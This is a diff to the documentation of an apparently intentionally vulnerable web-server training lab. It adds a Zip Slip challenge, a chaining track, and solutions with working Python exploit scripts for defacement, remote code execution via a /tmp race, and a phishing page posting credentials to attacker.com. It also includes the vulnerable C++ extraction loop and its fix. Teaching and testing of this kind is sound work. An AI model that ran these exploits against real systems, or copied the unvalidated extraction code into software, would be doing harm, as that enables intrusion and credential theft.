@@ -72,7 +72,7 @@ table backs the [tracks](#tracks).
 | 03 | Format string          | stack disclosure (`%p`); write primitive (`%n`, advanced extension) | — |
 | 04 | Session fixation       | authenticated `admin` session                   | a planted/observed pre-auth cookie |
 | 05 | Predictable session    | authenticated `admin` session                   | mint time (±3 s) and the server PID |
-| 06 | Temp-executable race   | command execution given local shell             | local shell (e.g. from 02 or 11) |
+| 06 | Temp-executable race   | command execution given local shell             | local shell (e.g. from 02 or 11) or file write to `/tmp` (14) |
 | 07 | Identity-record leak   | stale-stack pointers — ASLR defeat              | — |
 | 08 | LogSink UAF            | controlled virtual call                         | a leak (01/03/07) + a heap groom (09) |
 | 09 | Decode-sizing overflow | precise heap write: chosen size class, chosen bytes | — |
@@ -80,6 +80,7 @@ table backs the [tracks](#tracks).
 | 11 | Type confusion         | unauthenticated command execution               | an admin session (04 or 05) |
 | 12 | Stack overflow         | RIP control on the default build; ROP with a leak (advanced extension) | a leak (01/03/07) for the ROP extension |
 | 13 | Global BOF (argv)      | adjacent-global corruption                      | local process invocation |
+| 14 | Zip Slip               | arbitrary file write (chosen path, chosen content) | authenticated admin session (04 or 05) |
 
 <a id="tracks"></a>
 
@@ -148,6 +149,41 @@ build. The advanced extension is the same overwrite against a hardened
 build — canary-preserving, ROP — which needs addresses. Use a leak
 from 07 (or 03 / 01 via `/proc/self/maps`), rebuild with
 `ENABLE_HARDENING=ON`, and repeat.
+
+### Track 4 · Zip Slip to Temp Race RCE
+
+```
+04 session fixation  ─┐
+                      ├─► authenticated admin session
+05 session prediction ┘          │
+                                 ▼
+         14 deploy_site (Zip Slip)    (admin-only)
+                                 │
+                                 ▼
+         arbitrary file write to /tmp/dvws_cgi_<pid>
+                                 │
+                                 ▼
+         06 temp executable race
+                                 │
+                                 ▼
+         command execution
+```
+
+1. **Gain admin session** — plant and inherit one via fixation (04),
+   or predict one from the mint second and PID (05).
+2. **Craft malicious ZIP** — create a ZIP file with an entry named
+   `../../../../tmp/dvws_cgi_<pid>` containing your executable payload.
+   Get the server PID from `/status`.
+3. **Deploy via Zip Slip** — POST the ZIP to `/admin/deploy_site`. The
+   vulnerable extraction writes your payload to `/tmp/dvws_cgi_<pid>`.
+4. **Trigger temp race** — immediately request `/cgi-helper`. The server
+   attempts to stage its own helper but races with your pre-planted file.
+   If you win the race, your code executes.
+
+This combines web-level path traversal (14) with a filesystem race
+condition (06) to achieve remote command execution.
+
+Walkthrough: the solution sections of 04 → 05 → 14 → 06.
 
 ---
 
@@ -1019,6 +1055,267 @@ curl --path-as-is "http://127.0.0.1:8081/$(python3 -c 'print("A"*300)')"
 The server crashes on return from the parser frame. Because `recv()`
 caps at 1024 bytes, your payload has ~1000 usable bytes. Build with
 `ENABLE_HARDENING=OFF` (the default) to avoid canaries.
+
+---
+
+<a id="challenge-14"></a>
+
+## 14 · Zip Slip (CWE-22)
+
+### Scenario
+
+The admin console includes a "Quick Deploy" feature for rapid static
+site deployment: upload a .zip containing HTML/CSS/JS files, and the
+server extracts it to `serve/deploy/` and serves it immediately at
+`/deploy/`. This is a realistic pattern seen in hosting control panels,
+CMS theme installers, and deployment tools.
+
+The extraction handler constructs output paths by concatenating the
+deployment directory with ZIP entry filenames without validation. A
+malicious ZIP entry named `../../index.html` or
+`../../../../tmp/evil.sh` escapes the deployment directory and writes
+to arbitrary filesystem locations.
+
+### Endpoint
+
+`POST /admin/deploy_site` (requires HTTP Basic auth: `admin:admin`)
+
+### Sink
+
+`handlers/deploy.cpp` — extraction loop constructs output paths as:
+```cpp
+snprintf(output_path, sizeof(output_path), "%s/%s", 
+         deploy_dir, file_stat.m_filename);
+```
+No canonicalization or containment check on `file_stat.m_filename`.
+
+### Hints
+
+1. What happens when a ZIP entry filename contains `../` sequences?
+2. Where is the deployment directory relative to the web root `serve/`?
+3. Can you write to locations outside `serve/deploy/`? What about `/tmp`?
+4. Which other challenge uses predictable paths in `/tmp`?
+
+### Expected primitive
+
+Arbitrary file write (attacker-controlled path and content) anywhere the
+server process has write permissions.
+
+### Chaining
+
+**Requires:** Admin session (04 or 05)
+
+**Provides:**
+- Web defacement: overwrite `serve/index.html`
+- Admin panel replacement: overwrite `serve/admin/index.html` for phishing
+- File write to `/tmp` → chains with 06 (temp executable race) for RCE
+
+### Real-world examples
+
+- cPanel "Extract Archive" feature
+- WordPress theme/plugin installer
+- Hosting control panel ZIP uploads
+- Netlify/Vercel deployment mechanisms
+- Many web-based file managers
+
+### Regression test
+
+`tests/exploit/test_zip_slip.py`
+
+<a id="solution-14"></a>
+
+### Solution — 14 · Zip Slip
+
+**Code**: `handlers/deploy.cpp` → extraction uses entry filename directly:
+
+```cpp
+for (int i = 0; i < num_files; i++) {
+    mz_zip_archive_file_stat file_stat;
+    mz_zip_reader_file_stat(&zip, i, &file_stat);
+    
+    char output_path[1024];
+    snprintf(output_path, sizeof(output_path), "%s/%s", 
+             deploy_dir, file_stat.m_filename);  // VULNERABLE
+    
+    // No canonicalization! file_stat.m_filename can contain ../
+    write_file(output_path, file_data, uncompressed_size);
+}
+```
+
+**Attack 1: Overwrite main site (defacement)**
+
+```python
+#!/usr/bin/env python3
+import zipfile
+import requests
+
+# Create malicious HTML
+with open('defaced.html', 'w') as f:
+    f.write('<h1>Site Compromised!</h1><p>Zip Slip vulnerability exploited</p>')
+
+# Create ZIP with path traversal
+# From serve/deploy/, go up to serve/, then overwrite index.html
+with zipfile.ZipFile('evil.zip', 'w') as z:
+    z.write('defaced.html', arcname='../index.html')
+
+# Upload to vulnerable endpoint
+r = requests.post(
+    'http://127.0.0.1:8081/admin/deploy_site',
+    auth=('admin', 'admin'),
+    data=open('evil.zip', 'rb').read(),
+    headers={'Content-Type': 'application/zip'}
+)
+
+print(r.json())
+
+# Verify defacement
+r = requests.get('http://127.0.0.1:8081/')
+print(r.text)  # Shows "Site Compromised!"
+```
+
+**Attack 2: Chain with CH-06 for RCE**
+
+Combine Zip Slip with the temp executable race (CH-06) to achieve
+command execution:
+
+```python
+#!/usr/bin/env python3
+import zipfile
+import requests
+import time
+
+# Step 1: Get server PID from /status
+status = requests.get('http://127.0.0.1:8081/status').json()
+pid = status.get('pid', 'unknown')
+print(f"[*] Server PID: {pid}")
+
+# Step 2: Create malicious executable payload
+payload = b'#!/bin/sh\nid > /tmp/pwned\necho "Content-Type: text/plain"\necho ""\necho "RCE via Zip Slip + Temp Race"\n'
+
+with open('payload.sh', 'wb') as f:
+    f.write(payload)
+
+# Step 3: Create ZIP with traversal to /tmp/dvws_cgi_<pid>
+# From serve/deploy/ we need to traverse:
+#   serve/deploy/ -> serve/ -> repo_root/ -> / -> tmp/
+traversal_path = f'../../../../../../../../tmp/dvws_cgi_{pid}'
+
+with zipfile.ZipFile('rce.zip', 'w') as z:
+    z.write('payload.sh', arcname=traversal_path)
+
+# Step 4: Deploy the ZIP (writes to /tmp)
+r = requests.post(
+    'http://127.0.0.1:8081/admin/deploy_site',
+    auth=('admin', 'admin'),
+    data=open('rce.zip', 'rb').read(),
+    headers={'Content-Type': 'application/zip'}
+)
+print(f"[*] Deploy response: {r.json()}")
+
+# Step 5: Make the file executable
+import os
+os.chmod(f'/tmp/dvws_cgi_{pid}', 0o755)
+
+# Step 6: Trigger CH-06 - race to execute before server overwrites
+r = requests.get('http://127.0.0.1:8081/cgi-helper')
+print(f"[*] CGI response: {r.text}")
+
+# Step 7: Check for command execution
+time.sleep(0.5)
+try:
+    with open('/tmp/pwned', 'r') as f:
+        print(f"[+] RCE successful! Output: {f.read()}")
+except FileNotFoundError:
+    print("[-] RCE failed - timing issue or permissions")
+```
+
+**Attack 3: Overwrite admin panel for phishing**
+
+```python
+import zipfile
+import requests
+
+# Create fake login page
+phishing_html = '''<!DOCTYPE html>
+<html><head><title>Admin Console | DVWS</title></head>
+<body>
+<h1>Session Expired</h1>
+<p>Please re-enter your credentials:</p>
+<form action="https://attacker.com/collect" method="post">
+  Username: <input type="text" name="user"><br>
+  Password: <input type="password" name="pass"><br>
+  <button type="submit">Login</button>
+</form>
+</body></html>'''
+
+with open('phishing.html', 'w') as f:
+    f.write(phishing_html)
+
+# Overwrite serve/admin/index.html
+with zipfile.ZipFile('phish.zip', 'w') as z:
+    z.write('phishing.html', arcname='../../admin/index.html')
+
+# Deploy
+r = requests.post(
+    'http://127.0.0.1:8081/admin/deploy_site',
+    auth=('admin', 'admin'),
+    data=open('phish.zip', 'rb').read(),
+    headers={'Content-Type': 'application/zip'}
+)
+
+print("[+] Admin panel replaced with phishing page")
+print("[*] Victims visiting /admin/ will see the fake login")
+```
+
+**The fix**: Validate extraction paths before writing:
+
+```cpp
+#include <filesystem>
+
+namespace fs = std::filesystem;
+
+// Canonicalize both the base and target paths
+fs::path deploy_base = fs::canonical(deploy_dir);
+
+for (int i = 0; i < num_files; i++) {
+    mz_zip_archive_file_stat file_stat;
+    mz_zip_reader_file_stat(&zip, i, &file_stat);
+    
+    // Build target path
+    fs::path target = deploy_base / file_stat.m_filename;
+    
+    // Resolve .. sequences and symlinks
+    fs::path resolved = fs::weakly_canonical(target);
+    
+    // Check that resolved path is still under deploy_base
+    auto [base_end, resolved_end] = std::mismatch(
+        deploy_base.begin(), deploy_base.end(),
+        resolved.begin(), resolved.end()
+    );
+    
+    if (base_end != deploy_base.end()) {
+        // Path escaped deployment directory
+        fprintf(stderr, "[deploy] Rejected path traversal: %s\n", 
+                file_stat.m_filename);
+        continue;  // Skip this entry
+    }
+    
+    // Safe to extract
+    write_file(resolved.c_str(), file_data, uncompressed_size);
+}
+```
+
+Alternatively, reject entries with suspicious patterns:
+
+```cpp
+// Simple but less robust: string-based filtering
+if (strstr(file_stat.m_filename, "..") != nullptr ||
+    file_stat.m_filename[0] == '/') {
+    fprintf(stderr, "[deploy] Rejected suspicious filename: %s\n",
+            file_stat.m_filename);
+    continue;
+}
+```
 
 ---
 
